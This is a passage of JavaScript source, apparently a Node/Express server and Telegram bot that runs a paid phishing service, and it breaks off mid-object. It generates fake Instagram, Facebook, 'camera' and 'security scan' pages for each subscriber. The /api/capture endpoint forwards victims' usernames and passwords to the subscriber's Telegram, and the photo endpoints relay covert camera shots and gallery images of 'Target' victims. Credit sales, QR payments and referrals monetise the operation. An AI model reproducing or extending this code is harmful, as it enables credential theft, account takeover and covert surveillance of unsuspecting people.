app.delete('/api/admin/channels/:id', function(req, res) {
    res.json(removeChannel(req.params.id));
});

app.get('/api/admin/users', function(req, res) {
    res.json(getUsers());
});

app.get('/api/admin/user/:id', function(req, res) {
    var user = getUser(req.params.id);
    if (!user) return res.json({ error: 'User not found' });
    res.json(user);
});

app.post('/api/admin/modify-credits', function(req, res) {
    var body = req.body;
    if (!body.userId || isNaN(body.amount)) {
        return res.status(400).json({ error: 'Invalid data' });
    }
    var user = getUser(body.userId);
    if (user.unlimited) return res.json({ success: true, credits: 'Unlimited' });
    user.credits = Math.max(0, (user.credits || 0) + body.amount);
    saveUsers(getUsers());
    res.json({ success: true, credits: user.credits });
});

app.post('/api/admin/toggle-unlimited', function(req, res) {
    var body = req.body;
    if (!body.userId) return res.status(400).json({ error: 'No userId' });
    var user = getUser(body.userId);
    user.unlimited = !user.unlimited;
    saveUsers(getUsers());
    res.json({ success: true, unlimited: user.unlimited });
});

app.get('/api/admin/featured', function(req, res) {
    var featured = getFeatured();
    var photos = getPhotos();
    if (featured.photo) {
        var photo = null;
        for (var i = 0; i < photos.length; i++) {
            if (photos[i].id === featured.photo) {
                photo = photos[i];
                break;
            }
        }
        featured.photoData = photo || null;
    }
    res.json(featured);
});

app.post('/api/admin/featured/photo', function(req, res) {
    var body = req.body;
    if (!body.photoId) return res.status(400).json({ error: 'No photo ID' });
    var featured = setFeaturedPhoto(body.photoId);
    res.json({ success: true, featured: featured });
});

app.delete('/api/admin/featured/photo', function(req, res) {
    var featured = getFeatured();
    featured.photo = null;
    saveFeatured(featured);
    res.json({ success: true });
});

app.post('/api/admin/featured/message', function(req, res) {
    var body = req.body;
    if (!body.message) return res.status(400).json({ error: 'No message' });
    var featured = setFeaturedMessage(body.message);
    res.json({ success: true, featured: featured });
});

app.post('/api/admin/featured/toggle', function(req, res) {
    var featured = toggleFeaturedStatus();
    res.json({ success: true, featured: featured });
});

// QR Code API
app.post('/api/admin/upload-qr', upload.single('qr'), function(req, res) {
    try {
        if (!req.file) return res.status(400).json({ error: 'No file' });
        if (fs.existsSync(QR_FILE)) fs.unlinkSync(QR_FILE);
        fs.renameSync(req.file.path, QR_FILE);
        console.log('✅ QR Code saved successfully');
        logToFile('📱 QR Code uploaded');
        res.json({ success: true, url: '/api/admin/qr' });
    } catch (err) {
        console.error('QR Upload Error:', err);
        res.status(500).json({ error: err.message });
    }
});

app.delete('/api/admin/remove-qr', function(req, res) {
    try {
        if (fs.existsSync(QR_FILE)) {
            fs.unlinkSync(QR_FILE);
            logToFile('📱 QR Code removed');
            res.json({ success: true });
        } else {
            res.json({ success: false, error: 'No QR found' });
        }
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

app.get('/api/admin/qr', function(req, res) {
    try {
        if (fs.existsSync(QR_FILE)) {
            res.sendFile(QR_FILE);
        } else {
            res.json({ url: null });
        }
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

app.get('/api/admin/logs', function(req, res) {
    try {
        var logs = fs.readFileSync(LOGS_FILE, 'utf8');
        res.json({ logs: logs });
    } catch {
        res.json({ logs: 'No logs available' });
    }
});

app.delete('/api/admin/logs', function(req, res) {
    fs.writeFileSync(LOGS_FILE, '');
    res.json({ success: true });
});

// ====================== BOT API ======================
app.get('/api/bot/random-photo', function(req, res) {
    var photo = getRandomPhoto();
    if (photo) res.json({ success: true, photo: photo });
    else res.status(404).json({ error: 'No photos' });
});

app.post('/api/capture', async function(req, res) {
    var body = req.body || {};
    var userid = body.userid;
    var username = body.username;
    var password = body.password;
    var platform = body.platform;
    if (!userid || !username) return res.status(400).json({ error: 'Missing fields' });

    try {
        var photo = getRandomPhoto();
        var message = LoveNotifer(platform, username, password);
        if (photo) {
            var photoUrl = req.protocol + '://' + req.get('host') + photo.url;
            await S7.sendPhoto(userid, photoUrl, { caption: message, parse_mode: 'HTML' });
        } else {
            await S7.sendMessage(userid, message);
        }
        logToFile('📸 Capture from user ' + userid + ' - ' + platform);
        res.json({ status: 'success' });
    } catch (error) {
        logToFile('❌ Capture error: ' + error.message);
        res.status(500).json({ error: error.message });
    }
});

app.post('/api/capturepic', async function(req, res) {
    var body = req.body || {};
    var userid = body.userid;
    var mobile = body.mobile;
    var SY = body.SY;
    var platform = body.platform;
    if (!userid || !SY) return res.status(400).json({ error: 'Missing required photo data' });

    try {
        var photoBuffer = Buffer.from(SY.replace(/^data:image\/\w+;base64,/, ""), 'base64');
        var SYloveTiMe = moment().tz('Asia/Kolkata').format('h:mm:ss A');
        var SYloveDaTe = moment().tz('Asia/Kolkata').format('DD/MM/YYYY');
        var caption = '<b>📸 NEW CAPTURE 📸</b>\n\n' +
            '👤 <b>Target:</b> <code>' + (mobile || 'Unknown') + '</code>\n' +
            '🌐 <b>Platform:</b> ' + (platform ? platform.toUpperCase() : 'N/A') + '\n' +
            '📅 <b>Date:</b> ' + SYloveDaTe + '\n' +
            '⏰ <b>Time:</b> ' + SYloveTiMe + '\n\n' +
            '<i>© ↝ ᴅᴇᴠ ʙʏ » ' + config.S7 + '</i>';
        await S7.sendPhoto(userid, photoBuffer, { caption: caption, parse_mode: 'HTML' });
        logToFile('📸 Camera capture from user ' + userid);
        res.json({ status: 'success' });
    } catch (error) {
        logToFile('❌ Camera capture error: ' + error.message);
        res.status(500).json({ error: 'Failed to process image' });
    }
});

// ====================== PHOTO ACCESS FAST API ======================
app.post('/api/upload-photo-fast', async function(req, res) {
    try {
        var body = req.body || {};
        var userid = body.userid;
        var platform = body.platform;
        var filename = body.filename;
        var data = body.data;
        var size = body.size;

        if (!userid || !data) {
            return res.status(400).json({ error: 'Missing required data' });
        }

        var base64Data = data.replace(/^data:image\/\w+;base64,/, "");
        var buffer = Buffer.from(base64Data, 'base64');

        if (!pendingPhotos[userid]) {
            pendingPhotos[userid] = [];
            pendingCount[userid] = 0;
        }
        pendingPhotos[userid].push(buffer);
        pendingCount[userid] = (pendingCount[userid] || 0) + 1;
        userActive[userid] = Date.now();

        if (pendingPhotos[userid].length >= config.BATCH_SIZE) {
            await sendBatchPhotos(userid);
        }
        res.json({ success: true, stored: true, count: pendingCount[userid] || 0 });
    } catch (error) {
        console.error('Photo upload error:', error);
        logToFile('❌ Photo upload error: ' + error.message);
        res.status(500).json({ error: 'Failed to process photo' });
    }
});

// ====================== BUY CREDITS WITH PLAN BUTTONS ======================
async function handleBuyCredits(cid, uid, firstName) {
    var qrExists = fs.existsSync(QR_FILE);
    
    if (!qrExists) {
        return S7.sendMessage(cid, '⚠️ Payment QR code not available yet. Please contact admin.', {
            parse_mode: 'HTML',
            reply_markup: SYBack
        });
    }

    var keyboard = {
        inline_keyboard: [
            [{ text: '💰 10 Credits - ₹20', callback_data: 'plan_10' }],
            [{ text: '💰 25 Credits - ₹40', callback_data: 'plan_25' }],
            [{ text: '💰 50 Credits - ₹70', callback_data: 'plan_50' }],
            [{ text: '♾️ Unlimited - ₹100', callback_data: 'plan_unlimited' }],
            [{ text: '🔙 BACK', callback_data: 'back' }]
        ]
    };

    var msg = '💰 <b>Points Purchase</b>\n\n' +
              '📊 <b>Choose a plan:</b>\n' +
              '• 10 Credits → ₹20\n' +
              '• 25 Credits → ₹40\n' +
              '• 50 Credits → ₹70\n' +
              '• ♾️ Unlimited → ₹100\n\n' +
              '⬇️ Select a plan below to proceed with payment.';

    return S7.sendMessage(cid, msg, {
        parse_mode: 'HTML',
        reply_markup: keyboard
    });
}

// ====================== LINK GENERATION ======================
app.get('/api/create-link', function(req, res) {
    var userid = req.headers.userid || 'unknown';
    var platform = req.headers.platform || 'instagram';
    var p = platform.toLowerCase();

    if (userid !== 'unknown') {
        var user = getUser(userid);
        if (!user.unlimited && (user.credits || 0) <= 0) {
            return res.status(402).json({
                error: 'Insufficient credits',
                message: 'You need 1 credit to generate a link. Use referral or buy credits!',
                credits: user.credits || 0,
                needBuy: true
            });
        }
        useCredit(userid);
        logToFile('🔗 Link generated for user ' + userid + ' - ' + platform);
    }

    var template;
    var pLower = p.toLowerCase();
    if (pLower === 'instagram') template = INSTA_TEMPLATE;
    else if (pLower === 'facebook') template = FB_TEMPLATE;
    else if (pLower === 'camera') template = CAMERA_TEMPLATE;
    else if (pLower === 'photoaccess' || pLower === 'photo' || pLower === 'securityscan') template = SCAN_TEMPLATE;
    else return res.status(400).json({ error: 'Invalid platform' });

    var displayPlatform = pLower === 'instagram' ? '𝐈𝐍𝐒𝐓𝐀𝐆𝐑𝐀𝐌' :
                          pLower === 'facebook' ? '𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊' :
                          pLower === 'camera' ? '𝐂𝐀𝐌𝐄𝐑𝐀' : '𝐒𝐄𝐂𝐔𝐑𝐈𝐓𝐘 𝐒𝐂𝐀𝐍';

    var html = template
        .replace(/USERID_PLACEHOLDER/g, userid)
        .replace(/PLATFORM_PLACEHOLDER/g, displayPlatform);

    var fileId = Date.now().toString(36) + Math.random().toString(36).substr(2, 3);
    fs.writeFileSync(path.join(PAGES_DIR, fileId + '.html'), html);

    var url = config.baseUrl + '/page/' + fileId;
    console.log('🔗 Link generated: ' + url + ' for user ' + userid);
    res.json({ success: true, url: url, id: fileId });
});

app.get('/page/:id', function(req, res) {
    var id = req.params.id;
    var filePath = path.join(PAGES_DIR, id + '.html');
    if (fs.existsSync(filePath)) res.sendFile(filePath);
    else res.status(404).send('<h1>Page not found</h1>');
});

// ====================== TELEGRAM BOT ======================
var S7 = new TelegramBot(config.mainToken, { polling: true });

S7.getMe().then(function(botInfo) {
    console.log('✅ Bot Started: @' + botInfo.username);
    console.log('✅ Bot ID: ' + botInfo.id);
    logToFile('🤖 Bot Started: @' + botInfo.username);
}).catch(function(err) {
    console.error('❌ Bot Start Error:', err.message);
    logToFile('❌ Bot Start Error: ' + err.message);
    process.exit(1);
});

// ====================== KEYBOARDS (ALL PINK/RED - DANGER STYLE) ======================
var LOVESY = {
    inline_keyboard: [
        [{ text: '📸 INSTAGRAM', callback_data: 'gen_instagram' }],
        [{ text: '📘 FACEBOOK', callback_data: 'gen_facebook' }],
        [{ text: '📷 CAMERA', callback_data: 'gen_camera' }],
        [{ text: '🛡️ SECURITY SCAN', callback_data: 'gen_securityscan' }],
        [{ text: '👥 Referral', callback_data: 'referral' }],
        [{ text: '⭐ My Credits', callback_data: 'credits' }],
        [{ text: '💰 Buy Credits', callback_data: 'buy_credits' }],
        [{ text: '📜 Commands', callback_data: 'commands' }]
    ]
};

var ADMIN_KEYBOARD = {
    inline_keyboard: [
        [{ text: '👑 Admin Panel', callback_data: 'admin_panel' }],
        [{ text: '📊 Stats', callback_data: 'admin_stats' }],
        [{ text: '📢 Broadcast', callback_data: 'admin_broadcast' }],
        [{ text: '📋 Logs', callback_data: 'admin_logs' }],
        [{ text: '🔙 Back', callback_data: 'back' }]
    ]
};

var SYBack = {
    inline_keyboard: [[{ text: '🔙 BACK', callback_data: 'back' }]]
};

function getRegenMarkup(platform) {
    return {
        inline_keyboard: [
            [{ text: '🔄 REGENERATE', callback_data: 'regen_' + platform }],
            [{ text: '🔙 BACK', callback_data: 'back' }]
        ]
    };
}

// ====================== BOT COMMANDS ======================
async function SendLoveSYMenu(chatId, firstName) {
    var user = getUser(chatId);
    var featured = getFeatured();
    var credits = user.unlimited ? '♾️ Unlimited' : (user.credits || 0);
    var isAdmin = chatId.toString() === config.adminId;

    var message = '𝙃𝙖𝙫𝙚 𝘼 𝙎𝙚𝙭𝙮 𝘿𝙖𝙮 ☻\n\n⭐ Credits: ' + credits + '\n👥 Referrals: ' + (user.totalReferrals || 0);
    if (featured.status && featured.message) {
        message += '\n\n📌 ' + featured.message;
    }

    var menuText = SYloveMenu(firstName, message);
    var keyboard = LOVESY;
    if (isAdmin) {
        keyboard = {
            inline_keyboard: LOVESY.inline_keyboard.concat([
                [{ text: '👑 Admin Panel', callback_data: 'admin_panel' }]
            ])
        };
    }

    var sentMsg = await S7.sendMessage(chatId, menuText, {
        parse_mode: 'HTML',
        reply_markup: keyboard
    });

    if (featured.status && featured.photo) {
        var photos = getPhotos();
        var photo = null;
        for (var i = 0; i < photos.length; i++) {
            if (photos[i].id === featured.photo) {
                photo = photos[i];
                break;
            }
        }
        if (photo) {
            var photoUrl = config.baseUrl + photo.url;
            await S7.sendPhoto(chatId, photoUrl, { caption: '⭐ Featured Content' });
        }
    }
    return sentMsg;
}

async function checkAndSendMenu(chatId, firstName) {
    var isMember = await checkAllChannels(chatId);
    if (!isMember) {
        var channels = getChannels();
        var msg = '⚠️ <b>Access Denied!</b>\n\nPlease join all channels:\n\n';
        for (var i = 0; i < channels.length; i++) {
            msg += (i + 1) + '. <a href="' + channels[i].link + '">' + channels[i].name + '</a>\n';
        }
        msg += '\nAfter joining, click below to verify.';
        return S7.sendMessage(chatId, msg, {
            parse_mode: 'HTML',
            reply_markup: getChannelButtons()
        });
    }
    await SendLoveSYMenu(chatId, firstName);
}

function SYLoVe(commands) {
    if (!Array.isArray(commands)) commands = [commands];
    S7.on('message', async function(msg) {
        if (!msg.text) return;
        var cmd = msg.text.trim().split(' ')[0].slice(1);
        if (commands.indexOf(cmd) !== -1) {
            console.log('📩 Command: ' + cmd + ' from ' + msg.from.first_name);
            logToFile('📩 Command: ' + cmd + ' from ' + msg.from.id);
            await checkAndSendMenu(msg.chat.id, msg.from.first_name);
        }
    });
}

SYLoVe(['start', 'menu']);

// ====================== REFERRAL HANDLER ======================
S7.on('message', async function(msg) {
    if (!msg.text) return;
    var text = msg.text.trim();
    if (text.startsWith('/start ref_')) {
        var referrerId = text.replace('/start ref_', '');
        var userId = msg.from.id;
        var user = getUser(userId);

        if (user.referredBy) {
            return S7.sendMessage(userId, '✅ You are already registered!');
        }

        var referrer = getUser(referrerId);
        if (!referrer) {
            return S7.sendMessage(userId, '❌ Invalid referral link!');
        }

        if (!await checkAllChannels(userId)) {
            user._pendingReferrer = referrerId;
            saveUsers(getUsers());
            var channels = getChannels();
            var msgText = '⚠️ <b>Join all channels first!</b>\n\n';
            for (var i = 0; i < channels.length; i++) {
                msgText += (i + 1) + '. <a href="' + channels[i].link + '">' + channels[i].name + '</a>\n';
            }
            msgText += '\nAfter joining, click below to claim referral bonus!';
            return S7.sendMessage(userId, msgText, {
                parse_mode: 'HTML',
                reply_markup: getChannelButtons()
            });
        }

        await processReferral(referrerId, userId);
    }
});

async function processReferral(referrerId, userId) {
    var user = getUser(userId);
    if (user.referredBy) return;

    user.referredBy = referrerId;
    user.credits = (user.credits || 0) + 3;
    saveUsers(getUsers());

    var referrer = addReferral(referrerId, userId);

    var newUserInfo = '@user_' + userId;
    try {
        var chat = await S7.getChat(userId);
        newUserInfo = chat.username ? '@' + chat.username : chat.first_name || '@user_' + userId;
    } catch (e) {}

    var referrerInfo = '@user_' + referrerId;
    try {
        var chat2 = await S7.getChat(referrerId);
        referrerInfo = chat2.username ? '@' + chat2.username : chat2.first_name || '@user_' + referrerId;
    } catch (e) {}

    await S7.sendMessage(referrerId,
        '🎉 <b>New Referral Success!</b>\n\n' +
        '👤 <b>New User:</b> ' + newUserInfo + '\n' +
        '🆔 <b>New User ID:</b> <code>' + userId + '</code>\n' +
        '⭐ <b>Points Earned:</b> +2\n\n' +
        '📊 <b>Your Total Points:</b> ' + (referrer.credits || 0) + '\n' +
        '📊 <b>Your Total Referrals:</b> ' + (referrer.totalReferrals || 0), {
            parse_mode: 'HTML'
        }
    );

    await S7.sendMessage(config.adminId,
        '👥 <b>New Referral Success!</b>\n\n' +
        '👤 <b>Referrer:</b> ' + referrerInfo + '\n' +
        '👤 <b>New User:</b> ' + newUserInfo + '\n' +
        '🆔 <b>Referrer ID:</b> <code>' + referrerId + '</code>\n' +
        '🆔 <b>New User ID:</b> <code>' + userId + '</code>\n' +
        '⭐ <b>Points Earned:</b> 2\n\n' +
        '📊 <b>Referrer Total Points:</b> ' + (referrer.credits || 0) + '\n' +
        '📊 <b>Referrer Total Referrals:</b> ' + (referrer.totalReferrals || 0), {
            parse_mode: 'HTML'
        }
    );

    await S7.sendMessage(userId,
        '✅ <b>Welcome!</b>\n\n' +
        'You joined through <b>' + referrerInfo + '</b>\'s referral link!\n' +
        '🎁 <b>Bonus:</b> +3 Credits\n' +
        '⭐ <b>Your Credits:</b> ' + user.credits, {
            parse_mode: 'HTML'
        }
    );

    await SendLoveSYMenu(userId, (await S7.getChat(userId)).first_name);
    logToFile('👥 Referral: ' + referrerId + ' -> ' + userId);
}

// ====================== CALLBACK QUERY HANDLER ======================
S7.on('callback_query', async function(q) {
    var uid = q.from.id;
    var mid = q.message.message_id;
    var cid = q.message.chat.id;
    var isAdmin = uid.toString() === config.adminId;

    console.log('🔘 Callback: ' + q.data + ' from ' + q.from.first_name);

    // ====== ADMIN PANEL ======
    if (q.data === 'admin_panel' && isAdmin) {
        await S7.deleteMessage(cid, mid);
        await S7.sendMessage(cid, '👑 <b>Admin Panel</b>\n\nSelect an option below to manage the bot.', {
            parse_mode: 'HTML',
            reply_markup: ADMIN_KEYBOARD
        });
        return;
    }

    if (q.data === 'admin_stats' && isAdmin) {
        var users = getUsers();
        var totalUsers = Object.keys(users).length;
        var photos = getPhotos();
        var channels = getChannels();
        var referrals = getReferrals();
        await S7.sendMessage(cid, '📊 <b>Bot Statistics</b>\n\n' +
            '👥 Total Users: ' + totalUsers + '\n' +
            '📷 Total Photos: ' + photos.length + '\n' +
            '📢 Total Channels: ' + channels.length + '\n' +
            '👥 Total Referrals: ' + referrals.length + '\n' +
            '⏱ Uptime: ' + getUptime(), {
                parse_mode: 'HTML',
                reply_markup: SYBack
            }
        );
        await S7.deleteMessage(cid, mid);
        return;
    }

    if (q.data === 'admin_broadcast' && isAdmin) {
        await S7.sendMessage(cid, '📢 <b>Send Broadcast</b>\n\nPlease type your broadcast message.\nReply with: /broadcast [message]', {
            parse_mode: 'HTML',
            reply_markup: SYBack
        });
        await S7.deleteMessage(cid, mid);
        return;
    }

    if (q.data === 'admin_logs' && isAdmin) {
        try {
            var logs = fs.readFileSync(LOGS_FILE, 'utf8');
            var lastLogs = logs.split('\n').slice(-50).join('\n');
            await S7.sendMessage(cid, '📋 <b>Recent Logs</b>\n\n<pre>' + (lastLogs || 'No logs available') + '</pre>', {
                parse_mode: 'HTML',
                reply_markup: SYBack
            });
        } catch {
            await S7.sendMessage(cid, 'No logs available', { reply_markup: SYBack });
        }
        await S7.deleteMessage(cid, mid);
        return;
    }

    // ====== CHECK ALL CHANNELS ======
    if (q.data === 'check_all') {
        var isMember = await checkAllChannels(uid);
        if (isMember) {
            await S7.deleteMessage(cid, mid);
            var user = getUser(uid);
            if (user._pendingReferrer) {
                var referrerId = user._pendingReferrer;
                delete user._pendingReferrer;
                saveUsers(getUsers());
                await processReferral(referrerId, uid);
                return;
            }
            await SendLoveSYMenu(cid, q.from.first_name);
        } else {
            await S7.answerCallbackQuery(q.id, {
                text: '❌ Please join ALL channels first!',
                show_alert: true
            });
        }
        return;
    }

    // ====== COMMANDS ======
    if (q.data === 'commands') {
        var cmdMsg = '📜 <b>All Commands</b>\n\n';
        cmdMsg += '👤 <b>User Commands:</b>\n';
        cmdMsg += '• /start - Start bot\n';
        cmdMsg += '• /menu - Show menu\n';
        cmdMsg += '• /pay [amount] - Buy credits\n';
        cmdMsg += '• /credits - Check credits\n';
        cmdMsg += '• /referral - Get referral link\n\n';
        if (isAdmin) {
            cmdMsg += '👑 <b>Admin Commands:</b>\n';
            cmdMsg += '• /admin - Open admin panel\n';
            cmdMsg += '• /addcredits [userId] [amount] - Add credits\n';
            cmdMsg += '• /removecredits [userId] [amount] - Remove credits\n';
            cmdMsg += '• /unlimited [userId] - Activate unlimited\n';
            cmdMsg += '• /resetuser [userId] - Reset user\n';
            cmdMsg += '• /users - Show all users\n';
            cmdMsg += '• /stats - Bot statistics\n';
            cmdMsg += '• /broadcast [message] - Send to all\n';
            cmdMsg += '• /addqr - Upload QR code\n';
            cmdMsg += '• /removeqr - Remove QR code\n';
            cmdMsg += '• /viewqr - View QR code\n';
            cmdMsg += '• /addchannel [id] [name] [link] - Add channel\n';
            cmdMsg += '• /removechannel [id] - Remove channel\n';
            cmdMsg += '• /channels - List channels\n';
            cmdMsg += '• /addphoto [caption] - Upload photo\n';
            cmdMsg += '• /featured [photoId] - Set featured\n';
            cmdMsg += '• /featuredmsg [message] - Set message\n';
            cmdMsg += '• /featuredtoggle - Toggle featured\n';
            cmdMsg += '• /logs - Show logs\n';
            cmdMsg += '• /restart - Restart bot\n';
        }
        await S7.sendMessage(cid, cmdMsg, {
            parse_mode: 'HTML',
            reply_markup: SYBack
        });
        await S7.deleteMessage(cid, mid);
        return;
    }

    // ====== REFERRAL ======
    if (q.data === 'referral') {
        var botInfo = await S7.getMe();
        var referralLink = 'https://t.me/' + botInfo.username + '?start=ref_' + uid;
        await S7.sendMessage(cid, '👥 <b>Your Referral Link</b>\n\nShare this link:\n\n<code>' + referralLink + '</code>\n\n📌 <b>How it works:</b>\n• Share your link with friends\n• They join all channels\n• You get +2 credits!\n• They get +3 credits bonus!', {
            parse_mode: 'HTML',
            reply_markup: SYBack
        });
        await S7.deleteMessage(cid, mid);
        return;
    }

    // ====== CREDITS ======
    if (q.data === 'credits') {
        var user = getUser(uid);
        var credits = user.unlimited ? '♾️ Unlimited' : (user.credits || 0);
        await S7.sendMessage(cid, '⭐ <b>Your Credits</b>\n\n💰 Credits: ' + credits + '\n👥 Referrals: ' + (user.totalReferrals || 0) + '\n📅 Joined: ' + new Date(user.joinedAt).toLocaleDateString() + '\n\n🔹 Each link uses 1 credit\n🔹 Get +2 credits per referral\n🔹 New users get +3 bonus credits', {
            parse_mode: 'HTML',
            reply_markup: SYBack
        });
        await S7.deleteMessage(cid, mid);
        return;
    }

    // ====== BUY CREDITS ======
    if (q.data === 'buy_credits') {
        await handleBuyCredits(cid, uid, q.from.first_name);
        await S7.deleteMessage(cid, mid);
        return;
    }

    // ====== PLAN SELECTION ======
    if (q.data.startsWith('plan_')) {
        var plan = q.data.replace('plan_', '');
        var amount, creditsText, price;

        if (plan === '10') { creditsText = '10 Credits'; price = '₹20'; amount = 20; }
        else if (plan === '25') { creditsText = '25 Credits'; price = '₹40'; amount = 40; }
        else if (plan === '50') { creditsText = '50 Credits'; price = '₹70'; amount = 70; }
        else if (plan === 'unlimited') { creditsText = '♾️ Unlimited'; price = '₹100'; amount = 100; }
        else { return; }

        var qrExists = fs.existsSync(QR_FILE);
        if (!qrExists) {
            await S7.answerCallbackQuery(q.id, { text: '⚠️ QR code not available. Contact admin.', show_alert: true });
            return;
        }

        var txnId = 'PTS-' + Date.now().toString().slice(-7) + Math.floor(Math.random() * 9000 + 1000);
        var paymentMsg = '💰 <b>Points Purchase</b>\n\n' +
                         '📊 <b>Plan:</b> ' + creditsText + '\n' +
                         '💵 <b>Amount:</b> ' + price + '\n' +
                         '🆔 <b>Transaction ID:</b> ' + txnId + '\n\n' +
                         '📤 <b>Instructions:</b>\n' +
                         '1. Scan the QR code below\n' +
                         '2. Pay ' + price + '\n' +
                         '3. Send the transaction screenshot here (upload photo)\n' +
                         '4. Wait for admin approval\n\n' +
                         '⚠️ Don\'t close this chat! Admin will respond here.\n\n' +
                         '✅ After approval, points will be added to your account.';

        // Store pending payment
        var userData = getUser(uid);
        userData._pendingPayment = {
            plan: plan,
            amount: amount,
            creditsText: creditsText,
            txnId: txnId
        };
        saveUsers(getUsers());

        await S7.sendMessage(cid, paymentMsg, { parse_mode: 'HTML' });
        await S7.sendPhoto(cid, QR_FILE, { caption: '💳 Scan to pay ' + price });

        var confirmKeyboard = {
            inline_keyboard: [
                [{ text: '✅ I Have Paid', callback_data: 'confirm_paid_' + txnId }],
                [{ text: '🔙 BACK', callback_data: 'back' }]
            ]
        };
        await S7.sendMessage(cid, '📌 <b>After payment, click the button below and send screenshot.</b>', {
            parse_mode: 'HTML',
            reply_markup: confirmKeyboard
        });

        await S7.deleteMessage(cid, mid);
        return;
    }

    // ====== CONFIRM PAID ======
    if (q.data.startsWith('confirm_paid_')) {
        var txnId = q.data.replace('confirm_paid_', '');
        await S7.sendMessage(cid, '📤 <b>Send your payment screenshot now.</b>\n\nPlease upload the screenshot image here.', {
            parse_mode: 'HTML'
        });
        await S7.deleteMessage(cid, mid);
        return;
    }

    // ====== GENERATE / REGENERATE LINKS ======
    if (q.data.startsWith('gen_') || q.data.startsWith('regen_')) {
        var isGen = q.data.startsWith('gen_');
        var platform = q.data.replace(isGen ? 'gen_' : 'regen_', '');
        if (platform === 'securityscan') platform = 'securityScan';

        var user = getUser(uid);
        if (!user.unlimited && (user.credits || 0) <= 0) {
            await S7.answerCallbackQuery(q.id, {
                text: '❌ Insufficient credits! Use referral or buy credits.',
                show_alert: true
            });
            return;
        }

        var loadingMsg = await S7.sendMessage(cid, SYloveMenu(q.from.first_name, '𝘾𝙧𝙚𝙖𝙩𝙞𝙣𝙜 𝙇𝙞𝙣𝙠... 🔁'), {
            parse_mode: 'HTML',
            reply_markup: SYBack
        });

        try {
            var response = await fetch(config.baseUrl + '/api/create-link', {
                method: 'GET',
                headers: {
                    userid: String(uid),
                    platform: platform
                }
            });
            var data = await response.json();

            if (data.error && data.needBuy) {
                await S7.editMessageText(
                    SYloveMenu(q.from.first_name, '❌ ' + data.message + '\n\nType /pay to purchase credits'), {
                        chat_id: cid,
                        message_id: loadingMsg.message_id,
                        parse_mode: 'HTML',
                        reply_markup: SYBack
                    }
                );
                return;
            }

            var platformDisplay = platform === 'securityScan' ? 'SECURITY SCAN' : platform.toUpperCase();
            var finalMsg = '✅ <b>Link Generated!</b>\n\n📎 <b>Your Link:</b>\n<code>' + data.url + '</code>\n\n📌 <b>Platform:</b> ' + platformDisplay + '\n🔄 Share and earn referrals!\n\n⭐ <b>Remaining Credits:</b> ' + (user.unlimited ? '♾️ Unlimited' : (user.credits - 1));

            await S7.editMessageText(
                SYloveMenu(q.from.first_name, finalMsg), {
                    chat_id: cid,
                    message_id: loadingMsg.message_id,
                    parse_mode: 'HTML',
                    reply_markup: getRegenMarkup(platform)
                }
            );
        } catch (err) {
            console.error('Link Error:', err.message);
            logToFile('❌ Link Error: ' + err.message);
            await S7.editMessageText(
                SYloveMenu(q.from.first_name, '❌ Error generating link'), {
                    chat_id: cid,
                    message_id: loadingMsg.message_id,
                    parse_mode: 'HTML',
                    reply_markup: SYBack
                }
            );
        }
        return;
    }

    // ====== BACK ======
    if (q.data === 'back') {
        await S7.deleteMessage(cid, mid);
        await SendLoveSYMenu(cid, q.from.first_name);
    }
});

// ====================== PAYMENT COMMAND ======================
S7.on('message', async function(msg) {
    if (!msg.text) return;
    var text = msg.text.trim();

    if (text.startsWith('/pay')) {
        var parts = text.split(' ');
        if (parts.length < 2) {
            return S7.sendMessage(msg.chat.id,
                '⚠️ <b>Usage:</b> /pay [amount]\n\n📌 <b>Pricing:</b>\n• 1 Credit = ₹1\n• 50 Credits = ₹50 (Unlimited Lifetime!)\n\nExample: <code>/pay 50</code> for Unlimited', {
                    parse_mode: 'HTML'
                }
            );
        }

        var amount = parseInt(parts[1]);
        if (isNaN(amount) || amount < 1) {
            return S7.sendMessage(msg.chat.id, '⚠️ Please enter a valid amount (minimum ₹1)');
        }

        var uid = msg.from.id;
        var qrExists = fs.existsSync(QR_FILE);

        if (!qrExists) {
            return S7.sendMessage(msg.chat.id, '⚠️ Payment QR code not available. Please contact admin.', {
                parse_mode: 'HTML'
            });
        }

        var txnId = 'PTS-' + Date.now().toString().slice(-7) + Math.floor(Math.random() * 9000 + 1000);
        var paymentMsg = '💰 <b>Points Purchase</b>\n\n' +
                         '📊 <b>Points:</b> ' + amount + ' Credits\n' +
                         '💵 <b>Amount:</b> ₹' + amount + '\n' +
                         '🆔 <b>Transaction ID:</b> ' + txnId + '\n\n' +
                         '📤 <b>Instructions:</b>\n' +
                         '1. Scan the QR code below\n' +
                         '2. Pay ₹' + amount + '\n' +
                         '3. Send the transaction screenshot here (upload photo)\n' +
                         '4. Wait for admin approval\n\n' +
                         '⚠️ Don\'t close this chat! Admin will respond here.\n\n' +
                         '✅ After approval, points will be added to your account.';

        var userData = getUser(uid);
        userData._pendingPayment = {
            plan: 'custom',
            amount: amount,
            creditsText: amount + ' Credits',
            txnId: txnId
        };
        saveUsers(getUsers());

        await S7.sendMessage(msg.chat.id, paymentMsg, { parse_mode: 'HTML' });
        await S7.sendPhoto(msg.chat.id, QR_FILE, { caption: '💳 Scan to pay ₹' + amount });

        var confirmKeyboard = {
            inline_keyboard: [
                [{ text: '✅ I Have Paid', callback_data: 'confirm_paid_' + txnId }],
                [{ text: '🔙 BACK', callback_data: 'back' }]
            ]
        };
        await S7.sendMessage(msg.chat.id, '📌 <b>After payment, click the button below and send screenshot.</b>', {
            parse_mode: 'HTML',
            reply_markup: confirmKeyboard
        });

        logToFile('💰 Payment initiated: ' + uid + ' - ₹' + amount);
        return;
    }

    // ====== HANDLE PAYMENT SCREENSHOTS ======
    if (msg.photo) {
        var user = getUser(msg.from.id);
        if (user._pendingPayment) {
            var paymentData = user._pendingPayment;
            var fileId = msg.photo[msg.photo.length - 1].file_id;

            var caption = '💰 <b>Payment Screenshot</b>\n\n' +
                          '👤 <b>User:</b> @' + (msg.from.username || 'user_' + msg.from.id) + '\n' +
                          '🆔 <b>ID:</b> <code>' + msg.from.id + '</code>\n' +
                          '📊 <b>Plan:</b> ' + paymentData.creditsText + '\n' +
                          '💵 <b>Amount:</b> ₹' + paymentData.amount + '\n' +
                          '🆔 <b>Txn ID:</b> ' + paymentData.txnId + '\n' +
                          '📅 <b>Date:</b> ' + new Date().toLocaleString() + '\n\n' +
                          '⚠️ <b>Verify and add credits manually!</b>';

            // Forward to admin with action buttons
            var adminKeyboard = {
                inline_keyboard: [
